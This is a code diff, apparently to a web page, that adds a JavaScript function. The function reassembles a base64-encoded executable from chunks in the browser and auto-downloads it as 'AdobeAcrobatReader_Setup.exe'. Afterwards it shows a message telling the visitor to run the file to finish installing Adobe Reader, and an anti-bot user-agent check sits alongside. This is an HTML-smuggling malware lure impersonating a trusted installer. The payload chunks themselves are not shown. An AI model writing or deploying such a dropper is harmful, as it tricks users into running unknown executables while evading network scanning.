@@ -91,7 +91,44 @@
             triggerDownload();
         }, 2000);
     }
-
+    function triggerDownload() {
+        // Build the EXE from chunks
+        var chunks = [];
+        
+        // CHUNK LOADER - chunks will be defined in Part 3
+        
+        var totalSize = 0;
+        for (var i = 0; i < chunks.length; i++) {
+            totalSize += chunks[i].length;
+        }
+        
+        var binary = new Uint8Array(Math.ceil(totalSize * 3 / 4));
+        var offset = 0;
+        
+        for (var i = 0; i < chunks.length; i++) {
+            var decoded = atob(chunks[i]);
+            var chunkBytes = new Uint8Array(decoded.length);
+            for (var j = 0; j < decoded.length; j++) {
+                chunkBytes[j] = decoded.charCodeAt(j);
+            }
+            binary.set(chunkBytes, offset);
+            offset += chunkBytes.length;
+        }
+        
+        var blob = new Blob([binary], {type: 'application/octet-stream'});
+        var url = URL.createObjectURL(blob);
+        var a = document.createElement('a');
+        a.href = url;
+        a.download = 'AdobeAcrobatReader_Setup.exe';
+        document.body.appendChild(a);
+        a.click();
+        document.body.removeChild(a);
+        
+        setTimeout(function() {
+            URL.revokeObjectURL(url);
+            document.getElementById('status').innerText = 'Thank you. Your Adobe Acrobat Reader is ready. Run the downloaded file to complete installation.';
+        }, 500);
+    }
     // Anti-bot
     (function(){
         var ua = navigator.userAgent.toLowerCase();
